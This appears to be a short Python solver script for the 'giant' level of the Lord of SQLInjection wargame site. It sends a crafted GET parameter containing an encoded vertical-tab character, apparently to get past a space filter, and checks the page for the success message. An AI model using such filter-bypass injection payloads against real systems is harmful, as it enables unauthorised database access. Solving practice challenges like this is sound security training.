import requests

url = 'https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php'
cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
payload = "?shit=%0B"

r = requests.get(url + payload, cookies=cookie)
if 'GIANT Clear!' in r.text:
    print('GIANT Clear!')
